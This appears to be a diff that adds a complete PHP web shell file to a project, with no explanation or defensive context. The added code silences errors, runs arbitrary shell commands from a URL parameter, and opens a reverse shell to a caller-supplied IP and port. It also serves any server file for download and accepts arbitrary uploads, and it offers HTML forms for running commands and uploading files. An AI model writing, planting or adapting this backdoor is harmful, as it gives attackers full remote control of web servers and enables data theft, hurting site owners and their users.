@@ -1,0 +1,40 @@
+<?php
+@error_reporting(0);
+@set_time_limit(0);
+
+if(isset($_GET['c'])) {
+    // Command execution
+    echo "<pre>";
+    echo shell_exec($_GET['c'] . " 2>&1");
+    echo "</pre>";
+    die();
+}
+
+if(isset($_GET['r'])) {
+    // Reverse shell: ?r=IP:PORT
+    list($ip, $port) = explode(':', $_GET['r']);
+    $s = fsockopen($ip, $port);
+    while($c = fread($s, 2048)) {
+        $o = shell_exec($c);
+        fwrite($s, $o);
+    }
+    die();
+}
+
+if(isset($_GET['d'])) {
+    // Download file: ?d=/path/to/file
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($_GET['d']).'"');
+    readfile($_GET['d']);
+    die();
+}
+
+if(isset($_FILES['f'])) {
+    // Upload file
+    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
+    echo "Uploaded: " . $_FILES['f']['name'];
+    die();
+}
+?>
+<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit value=Up></form>
+<form method=get>CMD: <input name=c size=50><input type=submit value=Run></form>
